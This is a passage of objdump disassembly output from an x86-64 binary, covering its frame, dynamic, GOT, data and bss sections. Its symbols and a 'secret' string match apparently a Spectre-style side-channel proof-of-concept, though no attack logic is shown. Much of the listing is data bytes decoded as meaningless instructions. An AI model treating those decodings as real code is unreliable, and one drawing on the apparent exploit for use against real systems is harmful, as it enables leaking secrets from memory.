    1047:	ff 8f 00 00 00 00    	decl   0x0(%rdi)
    104d:	41 0e                	rex.B (bad) 
    104f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    1055:	41 83 03 02          	addl   $0x2,(%r11)
    1059:	89 0c 07             	mov    %ecx,(%rdi,%rax,1)
    105c:	08 00                	or     %al,(%rax)
    105e:	00 00                	add    %al,(%rax)
    1060:	1c 00                	sbb    $0x0,%al
    1062:	00 00                	add    %al,(%rax)
    1064:	dc 00                	faddl  (%rax)
    1066:	00 00                	add    %al,(%rax)
    1068:	e3 fa                	jrcxz  1064 <__GNU_EH_FRAME_HDR+0x180>
    106a:	ff                   	(bad)  
    106b:	ff af 00 00 00 00    	ljmp   *0x0(%rdi)
    1071:	41 0e                	rex.B (bad) 
    1073:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    1079:	02 aa 0c 07 08 00    	add    0x8070c(%rdx),%ch
    107f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    1082:	00 00                	add    %al,(%rax)
    1084:	fc                   	cld    
    1085:	00 00                	add    %al,(%rax)
    1087:	00 72 fb             	add    %dh,-0x5(%rdx)
    108a:	ff                   	(bad)  
    108b:	ff 96 00 00 00 00    	callq  *0x0(%rsi)
    1091:	41 0e                	rex.B (bad) 
    1093:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    1099:	02 91 0c 07 08 00    	add    0x8070c(%rcx),%dl
    109f:	00 24 00             	add    %ah,(%rax,%rax,1)
    10a2:	00 00                	add    %al,(%rax)
    10a4:	1c 01                	sbb    $0x1,%al
    10a6:	00 00                	add    %al,(%rax)
    10a8:	e8 fb ff ff 46       	callq  470010a8 <_end+0x46cfee68>
    10ad:	01 00                	add    %eax,(%rax)
    10af:	00 00                	add    %al,(%rax)
    10b1:	41 0e                	rex.B (bad) 
    10b3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    10b9:	45 83 03 03          	rex.RB addl $0x3,(%r11)
    10bd:	3c 01                	cmp    $0x1,%al
    10bf:	0c 07                	or     $0x7,%al
    10c1:	08 00                	or     %al,(%rax)
    10c3:	00 00                	add    %al,(%rax)
    10c5:	00 00                	add    %al,(%rax)
    10c7:	00 1c 00             	add    %bl,(%rax,%rax,1)
    10ca:	00 00                	add    %al,(%rax)
    10cc:	44 01 00             	add    %r8d,(%rax)
    10cf:	00 06                	add    %al,(%rsi)
    10d1:	fd                   	std    
    10d2:	ff                   	(bad)  
    10d3:	ff 4a 00             	decl   0x0(%rdx)
    10d6:	00 00                	add    %al,(%rax)
    10d8:	00 41 0e             	add    %al,0xe(%rcx)
    10db:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    10e1:	02 45 0c             	add    0xc(%rbp),%al
    10e4:	07                   	(bad)  
    10e5:	08 00                	or     %al,(%rax)
    10e7:	00 44 00 00          	add    %al,0x0(%rax,%rax,1)
    10eb:	00 64 01 00          	add    %ah,0x0(%rcx,%rax,1)
    10ef:	00 30                	add    %dh,(%rax)
    10f1:	fd                   	std    
    10f2:	ff                   	(bad)  
    10f3:	ff 65 00             	jmpq   *0x0(%rbp)
    10f6:	00 00                	add    %al,(%rax)
    10f8:	00 42 0e             	add    %al,0xe(%rdx)
    10fb:	10 8f 02 42 0e 18    	adc    %cl,0x180e4202(%rdi)
    1101:	8e 03                	mov    (%rbx),%es
    1103:	45 0e                	rex.RB (bad) 
    1105:	20 8d 04 42 0e 28    	and    %cl,0x280e4204(%rbp)
    110b:	8c 05 48 0e 30 86    	mov    %es,-0x79cff1b8(%rip)        # ffffffff86301f59 <_end+0xffffffff85fffd19>
    1111:	06                   	(bad)  
    1112:	48 0e                	rex.W (bad) 
    1114:	38 83 07 4d 0e 40    	cmp    %al,0x400e4d07(%rbx)
    111a:	72 0e                	jb     112a <__GNU_EH_FRAME_HDR+0x246>
    111c:	38 41 0e             	cmp    %al,0xe(%rcx)
    111f:	30 41 0e             	xor    %al,0xe(%rcx)
    1122:	28 42 0e             	sub    %al,0xe(%rdx)
    1125:	20 42 0e             	and    %al,0xe(%rdx)
    1128:	18 42 0e             	sbb    %al,0xe(%rdx)
    112b:	10 42 0e             	adc    %al,0xe(%rdx)
    112e:	08 00                	or     %al,(%rax)
    1130:	10 00                	adc    %al,(%rax)
    1132:	00 00                	add    %al,(%rax)
    1134:	ac                   	lods   %ds:(%rsi),%al
    1135:	01 00                	add    %eax,(%rax)
    1137:	00 58 fd             	add    %bl,-0x3(%rax)
    113a:	ff                   	(bad)  
    113b:	ff 02                	incl   (%rdx)
    113d:	00 00                	add    %al,(%rax)
    113f:	00 00                	add    %al,(%rax)
    1141:	00 00                	add    %al,(%rax)
	...

0000000000001144 <__FRAME_END__>:
    1144:	00 00                	add    %al,(%rax)
	...

Disassembly of section .init_array:

0000000000201d70 <__frame_dummy_init_array_entry>:
  201d70:	00 09                	add    %cl,(%rcx)
  201d72:	00 00                	add    %al,(%rax)
  201d74:	00 00                	add    %al,(%rax)
	...

Disassembly of section .fini_array:

0000000000201d78 <__do_global_dtors_aux_fini_array_entry>:
  201d78:	c0 08 00             	rorb   $0x0,(%rax)
  201d7b:	00 00                	add    %al,(%rax)
  201d7d:	00 00                	add    %al,(%rax)
	...

Disassembly of section .dynamic:

0000000000201d80 <_DYNAMIC>:
  201d80:	01 00                	add    %eax,(%rax)
  201d82:	00 00                	add    %al,(%rax)
  201d84:	00 00                	add    %al,(%rax)
  201d86:	00 00                	add    %al,(%rax)
  201d88:	01 00                	add    %eax,(%rax)
  201d8a:	00 00                	add    %al,(%rax)
  201d8c:	00 00                	add    %al,(%rax)
  201d8e:	00 00                	add    %al,(%rax)
  201d90:	0c 00                	or     $0x0,%al
  201d92:	00 00                	add    %al,(%rax)
  201d94:	00 00                	add    %al,(%rax)
  201d96:	00 00                	add    %al,(%rax)
  201d98:	20 07                	and    %al,(%rdi)
  201d9a:	00 00                	add    %al,(%rax)
  201d9c:	00 00                	add    %al,(%rax)
  201d9e:	00 00                	add    %al,(%rax)
  201da0:	0d 00 00 00 00       	or     $0x0,%eax
  201da5:	00 00                	add    %al,(%rax)
  201da7:	00 94 0e 00 00 00 00 	add    %dl,0x0(%rsi,%rcx,1)
  201dae:	00 00                	add    %al,(%rax)
  201db0:	19 00                	sbb    %eax,(%rax)
  201db2:	00 00                	add    %al,(%rax)
  201db4:	00 00                	add    %al,(%rax)
  201db6:	00 00                	add    %al,(%rax)
  201db8:	70 1d                	jo     201dd7 <_DYNAMIC+0x57>
  201dba:	20 00                	and    %al,(%rax)
  201dbc:	00 00                	add    %al,(%rax)
  201dbe:	00 00                	add    %al,(%rax)
  201dc0:	1b 00                	sbb    (%rax),%eax
  201dc2:	00 00                	add    %al,(%rax)
  201dc4:	00 00                	add    %al,(%rax)
  201dc6:	00 00                	add    %al,(%rax)
  201dc8:	08 00                	or     %al,(%rax)
  201dca:	00 00                	add    %al,(%rax)
  201dcc:	00 00                	add    %al,(%rax)
  201dce:	00 00                	add    %al,(%rax)
  201dd0:	1a 00                	sbb    (%rax),%al
  201dd2:	00 00                	add    %al,(%rax)
  201dd4:	00 00                	add    %al,(%rax)
  201dd6:	00 00                	add    %al,(%rax)
  201dd8:	78 1d                	js     201df7 <_DYNAMIC+0x77>
  201dda:	20 00                	and    %al,(%rax)
  201ddc:	00 00                	add    %al,(%rax)
  201dde:	00 00                	add    %al,(%rax)
  201de0:	1c 00                	sbb    $0x0,%al
  201de2:	00 00                	add    %al,(%rax)
  201de4:	00 00                	add    %al,(%rax)
  201de6:	00 00                	add    %al,(%rax)
  201de8:	08 00                	or     %al,(%rax)
  201dea:	00 00                	add    %al,(%rax)
  201dec:	00 00                	add    %al,(%rax)
  201dee:	00 00                	add    %al,(%rax)
  201df0:	f5                   	cmc    
  201df1:	fe                   	(bad)  
  201df2:	ff 6f 00             	ljmp   *0x0(%rdi)
  201df5:	00 00                	add    %al,(%rax)
  201df7:	00 98 02 00 00 00    	add    %bl,0x2(%rax)
  201dfd:	00 00                	add    %al,(%rax)
  201dff:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 201e05 <_DYNAMIC+0x85>
  201e05:	00 00                	add    %al,(%rax)
  201e07:	00 38                	add    %bh,(%rax)
  201e09:	04 00                	add    $0x0,%al
  201e0b:	00 00                	add    %al,(%rax)
  201e0d:	00 00                	add    %al,(%rax)
  201e0f:	00 06                	add    %al,(%rsi)
  201e11:	00 00                	add    %al,(%rax)
  201e13:	00 00                	add    %al,(%rax)
  201e15:	00 00                	add    %al,(%rax)
  201e17:	00 b8 02 00 00 00    	add    %bh,0x2(%rax)
  201e1d:	00 00                	add    %al,(%rax)
  201e1f:	00 0a                	add    %cl,(%rdx)
  201e21:	00 00                	add    %al,(%rax)
  201e23:	00 00                	add    %al,(%rax)
  201e25:	00 00                	add    %al,(%rax)
  201e27:	00 e4                	add    %ah,%ah
  201e29:	00 00                	add    %al,(%rax)
  201e2b:	00 00                	add    %al,(%rax)
  201e2d:	00 00                	add    %al,(%rax)
  201e2f:	00 0b                	add    %cl,(%rbx)
  201e31:	00 00                	add    %al,(%rax)
  201e33:	00 00                	add    %al,(%rax)
  201e35:	00 00                	add    %al,(%rax)
  201e37:	00 18                	add    %bl,(%rax)
  201e39:	00 00                	add    %al,(%rax)
  201e3b:	00 00                	add    %al,(%rax)
  201e3d:	00 00                	add    %al,(%rax)
  201e3f:	00 15 00 00 00 00    	add    %dl,0x0(%rip)        # 201e45 <_DYNAMIC+0xc5>
	...
  201e4d:	00 00                	add    %al,(%rax)
  201e4f:	00 03                	add    %al,(%rbx)
  201e51:	00 00                	add    %al,(%rax)
  201e53:	00 00                	add    %al,(%rax)
  201e55:	00 00                	add    %al,(%rax)
  201e57:	00 70 1f             	add    %dh,0x1f(%rax)
  201e5a:	20 00                	and    %al,(%rax)
  201e5c:	00 00                	add    %al,(%rax)
  201e5e:	00 00                	add    %al,(%rax)
  201e60:	02 00                	add    (%rax),%al
  201e62:	00 00                	add    %al,(%rax)
  201e64:	00 00                	add    %al,(%rax)
  201e66:	00 00                	add    %al,(%rax)
  201e68:	f0 00 00             	lock add %al,(%rax)
  201e6b:	00 00                	add    %al,(%rax)
  201e6d:	00 00                	add    %al,(%rax)
  201e6f:	00 14 00             	add    %dl,(%rax,%rax,1)
  201e72:	00 00                	add    %al,(%rax)
  201e74:	00 00                	add    %al,(%rax)
  201e76:	00 00                	add    %al,(%rax)
  201e78:	07                   	(bad)  
  201e79:	00 00                	add    %al,(%rax)
  201e7b:	00 00                	add    %al,(%rax)
  201e7d:	00 00                	add    %al,(%rax)
  201e7f:	00 17                	add    %dl,(%rdi)
  201e81:	00 00                	add    %al,(%rax)
  201e83:	00 00                	add    %al,(%rax)
  201e85:	00 00                	add    %al,(%rax)
  201e87:	00 30                	add    %dh,(%rax)
  201e89:	06                   	(bad)  
  201e8a:	00 00                	add    %al,(%rax)
  201e8c:	00 00                	add    %al,(%rax)
  201e8e:	00 00                	add    %al,(%rax)
  201e90:	07                   	(bad)  
  201e91:	00 00                	add    %al,(%rax)
  201e93:	00 00                	add    %al,(%rax)
  201e95:	00 00                	add    %al,(%rax)
  201e97:	00 70 05             	add    %dh,0x5(%rax)
  201e9a:	00 00                	add    %al,(%rax)
  201e9c:	00 00                	add    %al,(%rax)
  201e9e:	00 00                	add    %al,(%rax)
  201ea0:	08 00                	or     %al,(%rax)
  201ea2:	00 00                	add    %al,(%rax)
  201ea4:	00 00                	add    %al,(%rax)
  201ea6:	00 00                	add    %al,(%rax)
  201ea8:	c0 00 00             	rolb   $0x0,(%rax)
  201eab:	00 00                	add    %al,(%rax)
  201ead:	00 00                	add    %al,(%rax)
  201eaf:	00 09                	add    %cl,(%rcx)
  201eb1:	00 00                	add    %al,(%rax)
  201eb3:	00 00                	add    %al,(%rax)
  201eb5:	00 00                	add    %al,(%rax)
  201eb7:	00 18                	add    %bl,(%rax)
  201eb9:	00 00                	add    %al,(%rax)
  201ebb:	00 00                	add    %al,(%rax)
  201ebd:	00 00                	add    %al,(%rax)
  201ebf:	00 1e                	add    %bl,(%rsi)
  201ec1:	00 00                	add    %al,(%rax)
  201ec3:	00 00                	add    %al,(%rax)
  201ec5:	00 00                	add    %al,(%rax)
  201ec7:	00 08                	add    %cl,(%rax)
  201ec9:	00 00                	add    %al,(%rax)
  201ecb:	00 00                	add    %al,(%rax)
  201ecd:	00 00                	add    %al,(%rax)
  201ecf:	00 fb                	add    %bh,%bl
  201ed1:	ff                   	(bad)  
  201ed2:	ff 6f 00             	ljmp   *0x0(%rdi)
  201ed5:	00 00                	add    %al,(%rax)
  201ed7:	00 01                	add    %al,(%rcx)
  201ed9:	00 00                	add    %al,(%rax)
  201edb:	08 00                	or     %al,(%rax)
  201edd:	00 00                	add    %al,(%rax)
  201edf:	00 fe                	add    %bh,%dh
  201ee1:	ff                   	(bad)  
  201ee2:	ff 6f 00             	ljmp   *0x0(%rdi)
  201ee5:	00 00                	add    %al,(%rax)
  201ee7:	00 40 05             	add    %al,0x5(%rax)
  201eea:	00 00                	add    %al,(%rax)
  201eec:	00 00                	add    %al,(%rax)
  201eee:	00 00                	add    %al,(%rax)
  201ef0:	ff                   	(bad)  
  201ef1:	ff                   	(bad)  
  201ef2:	ff 6f 00             	ljmp   *0x0(%rdi)
  201ef5:	00 00                	add    %al,(%rax)
  201ef7:	00 01                	add    %al,(%rcx)
  201ef9:	00 00                	add    %al,(%rax)
  201efb:	00 00                	add    %al,(%rax)
  201efd:	00 00                	add    %al,(%rax)
  201eff:	00 f0                	add    %dh,%al
  201f01:	ff                   	(bad)  
  201f02:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f05:	00 00                	add    %al,(%rax)
  201f07:	00 1c 05 00 00 00 00 	add    %bl,0x0(,%rax,1)
  201f0e:	00 00                	add    %al,(%rax)
  201f10:	f9                   	stc    
  201f11:	ff                   	(bad)  
  201f12:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f15:	00 00                	add    %al,(%rax)
  201f17:	00 03                	add    %al,(%rbx)
	...

Disassembly of section .got:

0000000000201f70 <_GLOBAL_OFFSET_TABLE_>:
  201f70:	80 1d 20 00 00 00 00 	sbbb   $0x0,0x20(%rip)        # 201f97 <_GLOBAL_OFFSET_TABLE_+0x27>
	...
  201f87:	00 56 07             	add    %dl,0x7(%rsi)
  201f8a:	00 00                	add    %al,(%rax)
  201f8c:	00 00                	add    %al,(%rax)
  201f8e:	00 00                	add    %al,(%rax)
  201f90:	66 07                	data16 (bad) 
  201f92:	00 00                	add    %al,(%rax)
  201f94:	00 00                	add    %al,(%rax)
  201f96:	00 00                	add    %al,(%rax)
  201f98:	76 07                	jbe    201fa1 <_GLOBAL_OFFSET_TABLE_+0x31>
  201f9a:	00 00                	add    %al,(%rax)
  201f9c:	00 00                	add    %al,(%rax)
  201f9e:	00 00                	add    %al,(%rax)
  201fa0:	86 07                	xchg   %al,(%rdi)
  201fa2:	00 00                	add    %al,(%rax)
  201fa4:	00 00                	add    %al,(%rax)
  201fa6:	00 00                	add    %al,(%rax)
  201fa8:	96                   	xchg   %eax,%esi
  201fa9:	07                   	(bad)  
  201faa:	00 00                	add    %al,(%rax)
  201fac:	00 00                	add    %al,(%rax)
  201fae:	00 00                	add    %al,(%rax)
  201fb0:	a6                   	cmpsb  %es:(%rdi),%ds:(%rsi)
  201fb1:	07                   	(bad)  
  201fb2:	00 00                	add    %al,(%rax)
  201fb4:	00 00                	add    %al,(%rax)
  201fb6:	00 00                	add    %al,(%rax)
  201fb8:	b6 07                	mov    $0x7,%dh
  201fba:	00 00                	add    %al,(%rax)
  201fbc:	00 00                	add    %al,(%rax)
  201fbe:	00 00                	add    %al,(%rax)
  201fc0:	c6 07 00             	movb   $0x0,(%rdi)
  201fc3:	00 00                	add    %al,(%rax)
  201fc5:	00 00                	add    %al,(%rax)
  201fc7:	00 d6                	add    %dl,%dh
  201fc9:	07                   	(bad)  
  201fca:	00 00                	add    %al,(%rax)
  201fcc:	00 00                	add    %al,(%rax)
  201fce:	00 00                	add    %al,(%rax)
  201fd0:	e6 07                	out    %al,$0x7
	...

Disassembly of section .data:

0000000000202000 <__data_start>:
	...

0000000000202008 <__dso_handle>:
  202008:	08 20                	or     %ah,(%rax)
  20200a:	20 00                	and    %al,(%rax)
	...

0000000000202020 <bufferSize>:
  202020:	10 00                	adc    %al,(%rax)
	...

0000000000202024 <bufferSizeMask>:
  202024:	0f 00 00             	sldt   (%rax)
	...

0000000000202040 <buffer>:
  202040:	01 02                	add    %eax,(%rdx)
  202042:	03 04 05 06 07 08 09 	add    0x9080706(,%rax,1),%eax
  202049:	0a 0b                	or     (%rbx),%cl
  20204b:	0c 0d                	or     $0xd,%al
  20204d:	0e                   	(bad)  
  20204e:	0f 10 00             	movups (%rax),%xmm0
	...

00000000002020e0 <secret>:
  2020e0:	54                   	push   %rsp
  2020e1:	68 65 20 4d 61       	pushq  $0x614d2065
  2020e6:	67 69 63 20 57 6f 72 	imul   $0x64726f57,0x20(%ebx),%esp
  2020ed:	64 
  2020ee:	73 20                	jae    202110 <__TMC_END__>
  2020f0:	61                   	(bad)  
  2020f1:	72 65                	jb     202158 <temp+0x18>
  2020f3:	20 53 71             	and    %dl,0x71(%rbx)
  2020f6:	75 65                	jne    20215d <temp+0x1d>
  2020f8:	61                   	(bad)  
  2020f9:	6d                   	insl   (%dx),%es:(%rdi)
  2020fa:	69 73 68 20 4f 73 73 	imul   $0x73734f20,0x68(%rbx),%esi
  202101:	69 66 72 61 67 65 2e 	imul   $0x2e656761,0x72(%rsi),%esp
	...

Disassembly of section .bss:

0000000000202120 <completed.7697>:
	...

0000000000202140 <temp>:
	...

0000000000202160 <trycatch_buf>:
	...

0000000000202240 <array>:
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	47                   	rex.RXB
   1:	43                   	rex.XB
   2:	43 3a 20             	rex.XB cmp (%r8),%spl
   5:	28 55 62             	sub    %dl,0x62(%rbp)
   8:	75 6e                	jne    78 <_init-0x6a8>
   a:	74 75                	je     81 <_init-0x69f>
   c:	20 37                	and    %dh,(%rdi)
   e:	2e 34 2e             	cs xor $0x2e,%al
  11:	30 2d 31 75 62 75    	xor    %ch,0x75627531(%rip)        # 75627548 <_end+0x75325308>
  17:	6e                   	outsb  %ds:(%rsi),(%dx)
  18:	74 75                	je     8f <_init-0x691>
  1a:	31 7e 31             	xor    %edi,0x31(%rsi)
  1d:	38 2e                	cmp    %ch,(%rsi)
  1f:	30 34 2e             	xor    %dh,(%rsi,%rbp,1)
  22:	31 29                	xor    %ebp,(%rcx)
  24:	20 37                	and    %dh,(%rdi)
  26:	2e 34 2e             	cs xor $0x2e,%al
  29:	30 00                	xor    %al,(%rax)
